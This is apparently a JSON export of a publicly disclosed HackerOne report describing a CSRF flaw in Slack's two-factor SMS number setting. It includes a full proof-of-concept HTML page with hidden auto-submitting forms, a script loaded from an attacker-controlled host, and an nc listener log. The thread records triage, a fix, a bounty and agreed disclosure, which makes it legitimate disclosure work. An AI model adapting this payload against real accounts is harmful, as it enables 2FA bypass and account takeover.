{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2016-08-12T00:02:41.505Z", 
    "voters": [
        "lucky_sen", 
        "kxyry", 
        "ibram", 
        "dudez", 
        "dyabla"
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "500.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 155774, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2016-08-17T21:39:53.836Z", 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "CSRF - Add optional two factor mobile number", 
    "is_member_of_team?": null, 
    "vote_count": 5, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2016-09-11T00:02:41.652Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$500", 
    "attachments": [
        {
            "file_name": "slackcsrf.JPG", 
            "type": "image/jpeg", 
            "id": 108852, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/108/852/bc0782fd0be1df444d43fe8bf9af145bd579dec1/slackcsrf.JPG?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2SVVFJ4K%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T225020Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA4aDHbUi43kCnkCH8ghLCK3A1d0D7VWgJRDZWkdXXQGdmf7n%2FMcJt3uTEwb6Hdinq%2BFBbOAPOTsDxxrJ44I1M0GsX5wZenJPL8PevI%2FkbL9IqT6R%2BJKEKlPqPM6LpUT14hZkERpNFrQjbQc8QQ%2BGLJrYv6NGh3Ip0gK9gXfS%2BBt4RVWsZtku7hv1GxjVLrVN4tDuBx9kVUepW9naK5%2F0oXZzGIIp6Gjh%2FIKSsk58VEBKjC8XaVYCB%2BOEny5LgjoqjGxQtdacfYhOkVvkddEIug%2BxqJX03QrdlzYBPmNTl%2FPYt%2B7Ia6XenfHJpLptcsNwDKANRyeTTV%2FG3g%2BOCXLUeY4exATzHTwdvoYqOvrt5wMz9qaQRoRKK%2BUjVv5ctpYJvTH%2FMcrqKT%2Bat0Vu5%2B29B4mQPTT0FWbwQNEZv9s2WUcZfFK4nwDe%2FbWVaTYUyESNo3P9MBzjTGlE3RUSHfTIaws9cxbq%2B26X0Us8FyKWbfQU0Wz7XFi79Hu7vzT0q43xcUGempz37db7hbAD8s5J3Yuqly6EYzpKQo3hgzH0paY8Y8q0cEeQcN483KhHSXRw2GkwLMg8vEagxezp9Qvun6sYzBWVKsCvy4ohp2m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=13f64e47a0d9311f0f3e826dd0089814f6425ef144461bcef9540574083b3eb8"
        }
    ], 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2016-08-01T11:19:27.033Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-08-01T11:19:27.033Z", 
            "actor": {
                "username": "nhavis", 
                "url": "/nhavis", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "slack", 
            "message": "This also works when a Slack user doesn't have 2FA enabled yet - this means the CSRF could be used in a mass Denial of Service attack as each victim would not be able to login to their account.", 
            "markdown_message": "<p>This also works when a Slack user doesn&#39;t have 2FA enabled yet - this means the CSRF could be used in a mass Denial of Service attack as each victim would not be able to login to their account.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1099410, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-08-02T13:49:22.023Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-08-02T13:49:22.023Z", 
            "actor": {
                "username": "nhavis", 
                "url": "/nhavis", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "slack", 
            "message": "Can you confirm receipt of the issue?", 
            "markdown_message": "<p>Can you confirm receipt of the issue?</p>\n", 
            "type": "Activities::Comment", 
            "id": 1102241, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-08-02T17:10:41.605Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-08-02T17:10:41.605Z", 
            "actor": {
                "username": "maxfeldman", 
                "url": "/maxfeldman", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/613/f1dc7c1494fc501a1aedb5550f609e966611d0be_medium.png?1430293729"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "slack", 
            "message": "Hi @nhavis,\n\nSorry for the delay here - we'll be triaging this shortly.\n\nThanks!\nMax", 
            "markdown_message": "<p>Hi <a href=\"/nhavis\">@nhavis</a>,</p>\n\n<p>Sorry for the delay here - we&#39;ll be triaging this shortly.</p>\n\n<p>Thanks!<br>\nMax</p>\n", 
            "type": "Activities::Comment", 
            "id": 1102650, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-08-02T19:37:43.593Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-08-02T19:37:43.593Z", 
            "actor": {
                "username": "maxfeldman", 
                "url": "/maxfeldman", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/613/f1dc7c1494fc501a1aedb5550f609e966611d0be_medium.png?1430293729"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "slack", 
            "message": "@nhavis we've triaged this and are working on a fix!", 
            "markdown_message": "<p><a href=\"/nhavis\">@nhavis</a> we&#39;ve triaged this and are working on a fix!</p>\n", 
            "type": "Activities::BugTriaged", 
            "id": 1102896, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-08-02T23:25:20.700Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-08-02T23:25:20.700Z", 
            "actor": {
                "username": "nhavis", 
                "url": "/nhavis", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "slack", 
            "message": "No worries.\n\nLet me know if there's any questions.", 
            "markdown_message": "<p>No worries.</p>\n\n<p>Let me know if there&#39;s any questions.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1103234, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-08-04T09:08:01.334Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-08-04T09:08:01.334Z", 
            "actor": {
                "username": "nhavis", 
                "url": "/nhavis", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "slack", 
            "message": "Do you have an ETA for the fix?\n\nThanks.", 
            "markdown_message": "<p>Do you have an ETA for the fix?</p>\n\n<p>Thanks.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1105465, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-08-04T09:30:18.958Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-08-04T09:30:18.958Z", 
            "actor": {
                "username": "maxfeldman", 
                "url": "/maxfeldman", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/613/f1dc7c1494fc501a1aedb5550f609e966611d0be_medium.png?1430293729"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "slack", 
            "message": "Hi @nhavis,\n\nWe actually believe we've patched this - would you mind verifying that the fix has made it to your environment?\n\nThanks!\nMax", 
            "markdown_message": "<p>Hi <a href=\"/nhavis\">@nhavis</a>,</p>\n\n<p>We actually believe we&#39;ve patched this - would you mind verifying that the fix has made it to your environment?</p>\n\n<p>Thanks!<br>\nMax</p>\n", 
            "type": "Activities::Comment", 
            "id": 1105492, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-08-04T12:57:18.182Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-08-04T12:57:18.182Z", 
            "actor": {
                "username": "nhavis", 
                "url": "/nhavis", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "slack", 
            "message": "Yes it's been fixed - the crumb parameter is now checked. How do we proceed?\n\nThanks", 
            "markdown_message": "<p>Yes it&#39;s been fixed - the crumb parameter is now checked. How do we proceed?</p>\n\n<p>Thanks</p>\n", 
            "type": "Activities::Comment", 
            "id": 1105756, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-08-08T03:25:30.530Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-08-08T03:25:30.530Z", 
            "actor": {
                "username": "nhavis", 
                "url": "/nhavis", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "slack", 
            "message": "Can we resolve the issue?", 
            "markdown_message": "<p>Can we resolve the issue?</p>\n", 
            "type": "Activities::Comment", 
            "id": 1111728, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "nhavis", 
                "url": "/nhavis"
            }, 
            "created_at": "2016-08-08T21:46:12.142Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-08-08T21:46:12.142Z", 
            "actor": {
                "username": "maxfeldman", 
                "url": "/maxfeldman", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/613/f1dc7c1494fc501a1aedb5550f609e966611d0be_medium.png?1430293729"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "slack", 
            "message": "Sorry for the delay! We all just returned from Defcon :)", 
            "markdown_message": "<p>Sorry for the delay! We all just returned from Defcon :)</p>\n", 
            "type": "Activities::BugResolved", 
            "id": 1113642, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2016-08-08T21:46:48.133Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-08-08T21:46:48.133Z", 
            "actor": {
                "url": "/slack", 
                "profile": {
                    "name": "Slack"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/069/50cfd8e05b18bade214847ec5f61dcb9e6c85fa9_medium.png?1449082084"
                }
            }, 
            "team_handle": "slack", 
            "bounty_amount": "500.0", 
            "collaborator": {
                "username": "nhavis", 
                "url": "/nhavis"
            }, 
            "message": "Thanks for an interesting finding! Please keep up the good work :)\n\nThe Slack Security Team", 
            "markdown_message": "<p>Thanks for an interesting finding! Please keep up the good work :)</p>\n\n<p>The Slack Security Team</p>\n", 
            "type": "Activities::BountyAwarded", 
            "id": 1113644, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-08-10T13:24:16.423Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-08-10T13:24:16.423Z", 
            "actor": {
                "username": "nhavis", 
                "url": "/nhavis", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "slack", 
            "message": "Thanks.\n\nCan we make this public?", 
            "markdown_message": "<p>Thanks.</p>\n\n<p>Can we make this public?</p>\n", 
            "type": "Activities::Comment", 
            "id": 1117031, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-08-11T07:40:49.178Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-08-11T07:40:49.178Z", 
            "actor": {
                "username": "maxfeldman", 
                "url": "/maxfeldman", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/613/f1dc7c1494fc501a1aedb5550f609e966611d0be_medium.png?1430293729"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "slack", 
            "message": "@nhavis - yes, you can go ahead and request disclosure. thanks!", 
            "markdown_message": "<p><a href=\"/nhavis\">@nhavis</a> - yes, you can go ahead and request disclosure. thanks!</p>\n", 
            "type": "Activities::Comment", 
            "id": 1118765, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-08-12T00:02:41.584Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-08-12T00:02:41.584Z", 
            "actor": {
                "username": "nhavis", 
                "url": "/nhavis", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "slack", 
            "first_to_agree": true, 
            "message": "Disclosure request.", 
            "markdown_message": "<p>Disclosure request.</p>\n", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1120764, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-08-17T09:57:29.528Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-08-17T09:57:29.528Z", 
            "actor": {
                "username": "nhavis", 
                "url": "/nhavis", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "slack", 
            "message": "Hi,\n\nDid you get the disclosure request?", 
            "markdown_message": "<p>Hi,</p>\n\n<p>Did you get the disclosure request?</p>\n", 
            "type": "Activities::Comment", 
            "id": 1131467, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-08-17T21:39:53.918Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-08-17T21:39:53.918Z", 
            "actor": {
                "username": "maxfeldman", 
                "url": "/maxfeldman", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/613/f1dc7c1494fc501a1aedb5550f609e966611d0be_medium.png?1430293729"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "slack", 
            "message": "Thanks @nhavis!", 
            "markdown_message": "<p>Thanks <a href=\"/nhavis\">@nhavis</a>!</p>\n", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1133031, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-08-17T21:39:54.023Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-08-17T21:39:54.023Z", 
            "actor": {
                "username": "maxfeldman", 
                "url": "/maxfeldman", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/613/f1dc7c1494fc501a1aedb5550f609e966611d0be_medium.png?1430293729"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "slack", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 1133032, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "nhavis", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/nhavis", 
        "profile_picture_urls": {
            "small": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 45, 
        "name": "Cross-Site Request Forgery (CSRF)"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -70584458.4663355, 
    "disclosed_at": "2016-08-17T21:39:53.991Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/155774", 
    "created_at": "2016-08-01T10:54:51.599Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<h1 id=\"description\">Description</h1>\n\n<p>Adding a mobile number for 2-factor authentication is vulnerable to CSRF, allowing an attacker to bypass 2-factor authentication. An attacker would be able to force the logged in user to add a new mobile number for 2-factor authentication. The attacker would then receive the SMS code and automatically make the victim verify it (in Javascript). When the attacker attempts to login to the victim&#39;s account, the verification code can then be sent to the attacker&#39;s mobile number. </p>\n\n<p>An attacker could be anyone trying to bypass 2-factor authentication, for example:</p>\n\n<ol>\n<li>Anyone who already has the password to an account.</li>\n<li>A company&#39;s IT administrator who has access to the user&#39;s e-mail and can reset the password.</li>\n</ol>\n\n<p>I have provided a complete Proof of Concept without the <strong>crumb</strong> parameter, which I have manually verified myself.</p>\n\n<h1 id=\"vulnerable-url\">Vulnerable URL:</h1>\n\n<ul>\n<li>/account/settings/2fa_sms</li>\n</ul>\n\n<h1 id=\"root-cause\">Root cause:</h1>\n\n<p>Server does not validate the existence or value of the <strong>crumb</strong> parameter containing the CSRF token.</p>\n\n<h1 id=\"sample-vulnerable-request\">Sample vulnerable request:</h1>\n<pre class=\"highlight plaintext\"><code>POST /account/settings/2fa_sms HTTP/1.1\nHost: cs-sa.slack.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-GB,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nCookie: REDACTED=REDACTED\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 109\n\nverify_two_factor=1&amp;backup=&amp;app=&amp;primary_phone_number=%2B61+0421653999&amp;country_code=AU&amp;phone_number=421653999\n</code></pre>\n<h1 id=\"attack-flow\">Attack flow:</h1>\n\n<ol>\n<li>Attacker sends logged in slack user a link and slack user clicks it.</li>\n<li>The link contains HTML and Javascript code that forces the victim in to adding a new 2-factor mobile number (<strong>slackcsrf.html</strong> provided below). The code does not contain the <strong>crumb</strong> parameter.</li>\n<li>The code also connects back to the attacker&#39;s machine waiting for the attacker to enter the code so it can be used for verification (within seconds and potentially automatically).</li>\n<li>The attacker receives the code via SMS and sends it back to the victim. (<strong>Attacker web server</strong> provided below)</li>\n<li>The HTML code forces the victim to verify the new mobile number.</li>\n<li>The mobile number has now been added to the victim&#39;s account for 2FA.</li>\n<li>The attacker logs in and bypasses 2FA by requesting the code with the secondary mobile number.</li>\n</ol>\n\n<h2 id=\"slackcsrf-html\">slackcsrf.html:</h2>\n<pre class=\"highlight html\"><code><span class=\"nt\">&lt;html&gt;</span>\n<span class=\"nt\">&lt;body&gt;</span>\n<span class=\"nt\">&lt;IFRAME</span> <span class=\"na\">style=</span><span class=\"s\">&quot;display:none&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;hidden-form&quot;</span><span class=\"nt\">&gt;&lt;/iframe&gt;</span>\n    <span class=\"nt\">&lt;form</span> <span class=\"na\">action=</span><span class=\"s\">&quot;https://cs-sa.slack.com/account/settings/2fa_sms&quot;</span> <span class=\"na\">method=</span><span class=\"s\">&quot;POST&quot;</span> <span class=\"na\">target=</span><span class=\"s\">&quot;hidden-form&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;pocframe&quot;</span><span class=\"nt\">&gt;</span>\n      <span class=\"nt\">&lt;input</span> <span class=\"na\">type=</span><span class=\"s\">&quot;hidden&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;verify&amp;#95;two&amp;#95;factor&quot;</span> <span class=\"na\">value=</span><span class=\"s\">&quot;1&quot;</span> <span class=\"nt\">/&gt;</span>\n      <span class=\"nt\">&lt;input</span> <span class=\"na\">type=</span><span class=\"s\">&quot;hidden&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;backup&quot;</span> <span class=\"na\">value=</span><span class=\"s\">&quot;&quot;</span> <span class=\"nt\">/&gt;</span>\n      <span class=\"nt\">&lt;input</span> <span class=\"na\">type=</span><span class=\"s\">&quot;hidden&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;app&quot;</span> <span class=\"na\">value=</span><span class=\"s\">&quot;&quot;</span> <span class=\"nt\">/&gt;</span>\n      <span class=\"nt\">&lt;input</span> <span class=\"na\">type=</span><span class=\"s\">&quot;hidden&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;country&amp;#95;code&quot;</span> <span class=\"na\">value=</span><span class=\"s\">&quot;AU&quot;</span> <span class=\"nt\">/&gt;</span>\n      <span class=\"nt\">&lt;input</span> <span class=\"na\">type=</span><span class=\"s\">&quot;hidden&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;phone&amp;#95;number&quot;</span> <span class=\"na\">value=</span><span class=\"s\">&quot;421653999&quot;</span> <span class=\"nt\">/&gt;</span>\n    <span class=\"nt\">&lt;/form&gt;</span>\n<span class=\"nt\">&lt;script&gt;</span><span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">pocframe</span><span class=\"p\">.</span><span class=\"nx\">submit</span><span class=\"p\">();</span><span class=\"nt\">&lt;/script&gt;</span>\n\n<span class=\"nt\">&lt;script </span><span class=\"na\">src=</span><span class=\"s\">&quot;http://192.168.1.82:8080/a&quot;</span><span class=\"nt\">&gt;&lt;/script&gt;</span>\n<span class=\"nt\">&lt;IFRAME</span> <span class=\"na\">style=</span><span class=\"s\">&quot;display:none&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;hidden-form2&quot;</span><span class=\"nt\">&gt;&lt;/iframe&gt;</span>\n    <span class=\"nt\">&lt;form</span> <span class=\"na\">action=</span><span class=\"s\">&quot;https://cs-sa.slack.com/account/settings/2fa_sms&quot;</span> <span class=\"na\">method=</span><span class=\"s\">&quot;POST&quot;</span> <span class=\"na\">target=</span><span class=\"s\">&quot;hidden-form2&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;pocframe2&quot;</span><span class=\"nt\">&gt;</span>\n      <span class=\"nt\">&lt;input</span> <span class=\"na\">type=</span><span class=\"s\">&quot;hidden&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;verify&amp;#95;two&amp;#95;factor&quot;</span> <span class=\"na\">value=</span><span class=\"s\">&quot;1&quot;</span> <span class=\"nt\">/&gt;</span>\n      <span class=\"nt\">&lt;input</span> <span class=\"na\">type=</span><span class=\"s\">&quot;hidden&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;backup&quot;</span> <span class=\"na\">value=</span><span class=\"s\">&quot;1&quot;</span> <span class=\"nt\">/&gt;</span>\n      <span class=\"nt\">&lt;input</span> <span class=\"na\">type=</span><span class=\"s\">&quot;hidden&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;app&quot;</span> <span class=\"na\">value=</span><span class=\"s\">&quot;&quot;</span> <span class=\"nt\">/&gt;</span>\n      <span class=\"nt\">&lt;input</span> <span class=\"na\">type=</span><span class=\"s\">&quot;hidden&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;formatted&amp;#95;phone&amp;#95;number&quot;</span> <span class=\"na\">value=</span><span class=\"s\">&quot;&amp;#43;61&amp;#32;421653999&quot;</span> <span class=\"nt\">/&gt;</span>\n      <span class=\"nt\">&lt;input</span> <span class=\"na\">type=</span><span class=\"s\">&quot;hidden&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;country&amp;#95;code&quot;</span> <span class=\"na\">value=</span><span class=\"s\">&quot;AU&quot;</span> <span class=\"nt\">/&gt;</span>\n      <span class=\"nt\">&lt;input</span> <span class=\"na\">type=</span><span class=\"s\">&quot;hidden&quot;</span> <span class=\"na\">id=</span><span class=\"s\">&quot;scode&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;confirmation&amp;#95;code&quot;</span> <span class=\"na\">value=</span><span class=\"s\">&quot;&quot;</span> <span class=\"nt\">/&gt;</span>\n    <span class=\"nt\">&lt;/form&gt;</span>\n<span class=\"nt\">&lt;script&gt;</span>\n    <span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">getElementById</span><span class=\"p\">(</span><span class=\"s2\">&quot;scode&quot;</span><span class=\"p\">).</span><span class=\"nx\">value</span> <span class=\"o\">=</span> <span class=\"nx\">scode</span><span class=\"p\">;</span>\n    <span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">pocframe2</span><span class=\"p\">.</span><span class=\"nx\">submit</span><span class=\"p\">();</span>\n<span class=\"nt\">&lt;/script&gt;</span>\n<span class=\"nt\">&lt;/body&gt;</span>\n<span class=\"nt\">&lt;/html&gt;</span>\n</code></pre>\n<h2 id=\"attacker-web-server\">Attacker web server:</h2>\n<pre class=\"highlight plaintext\"><code>root@foxtrotter:/var/www/html# nc -nlvp 8080\nlistening on [any] 8080 ...\nconnect to [192.168.1.82] from (UNKNOWN) [192.168.1.81] 56194\nGET /a HTTP/1.1\nHost: 192.168.1.82:8080\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0\nAccept: */*\nAccept-Language: en-GB,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://192.168.1.82/slackcsrf.html\nConnection: close\nCache-Control: max-age=0\n\nHTTP/1.1 200 OK\n\nscode=196206;\n</code></pre>", 
    "vulnerability_information": "Description\n====================\nAdding a mobile number for 2-factor authentication is vulnerable to CSRF, allowing an attacker to bypass 2-factor authentication. An attacker would be able to force the logged in user to add a new mobile number for 2-factor authentication. The attacker would then receive the SMS code and automatically make the victim verify it (in Javascript). When the attacker attempts to login to the victim's account, the verification code can then be sent to the attacker's mobile number. \n\nAn attacker could be anyone trying to bypass 2-factor authentication, for example:\n1. Anyone who already has the password to an account.\n2. A company's IT administrator who has access to the user's e-mail and can reset the password.\n\nI have provided a complete Proof of Concept without the **crumb** parameter, which I have manually verified myself.\n\nVulnerable URL:\n====================\n* /account/settings/2fa_sms\n\nRoot cause:\n====================\nServer does not validate the existence or value of the **crumb** parameter containing the CSRF token.\n\nSample vulnerable request:\n====================\n```\nPOST /account/settings/2fa_sms HTTP/1.1\nHost: cs-sa.slack.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-GB,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nCookie: REDACTED=REDACTED\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 109\n\nverify_two_factor=1&backup=&app=&primary_phone_number=%2B61+0421653999&country_code=AU&phone_number=421653999\n```\n\nAttack flow:\n====================\n1. Attacker sends logged in slack user a link and slack user clicks it.\n2. The link contains HTML and Javascript code that forces the victim in to adding a new 2-factor mobile number (**slackcsrf.html** provided below). The code does not contain the **crumb** parameter.\n3. The code also connects back to the attacker's machine waiting for the attacker to enter the code so it can be used for verification (within seconds and potentially automatically).\n4. The attacker receives the code via SMS and sends it back to the victim. (**Attacker web server** provided below)\n5. The HTML code forces the victim to verify the new mobile number.\n6. The mobile number has now been added to the victim's account for 2FA.\n7. The attacker logs in and bypasses 2FA by requesting the code with the secondary mobile number.\n\nslackcsrf.html:\n---------------------\n```\n<html>\n<body>\n<IFRAME style=\"display:none\" name=\"hidden-form\"></iframe>\n    <form action=\"https://cs-sa.slack.com/account/settings/2fa_sms\" method=\"POST\" target=\"hidden-form\" name=\"pocframe\">\n      <input type=\"hidden\" name=\"verify&#95;two&#95;factor\" value=\"1\" />\n      <input type=\"hidden\" name=\"backup\" value=\"\" />\n      <input type=\"hidden\" name=\"app\" value=\"\" />\n      <input type=\"hidden\" name=\"country&#95;code\" value=\"AU\" />\n      <input type=\"hidden\" name=\"phone&#95;number\" value=\"421653999\" />\n    </form>\n<script>document.pocframe.submit();</script>\n\n<script src=\"http://192.168.1.82:8080/a\"></script>\n<IFRAME style=\"display:none\" name=\"hidden-form2\"></iframe>\n    <form action=\"https://cs-sa.slack.com/account/settings/2fa_sms\" method=\"POST\" target=\"hidden-form2\" name=\"pocframe2\">\n      <input 